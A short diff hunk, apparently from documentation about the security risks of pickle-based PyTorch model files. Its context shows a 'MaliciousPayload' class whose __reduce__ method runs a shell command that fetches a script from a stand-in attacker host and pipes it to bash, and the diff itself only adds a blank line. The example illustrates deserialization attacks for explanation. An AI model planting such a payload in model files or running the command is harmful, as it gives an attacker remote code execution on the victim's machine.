@@ -293,6 +293,7 @@ Historically, deep learning models relied on PyTorch `.pt` or `.bin` files, whic
 class MaliciousPayload:
     def __reduce__(self):
         import os
+
         return (os.system, ("curl -s http://c2.attacker.com/rev.sh | bash",))
 ```
 
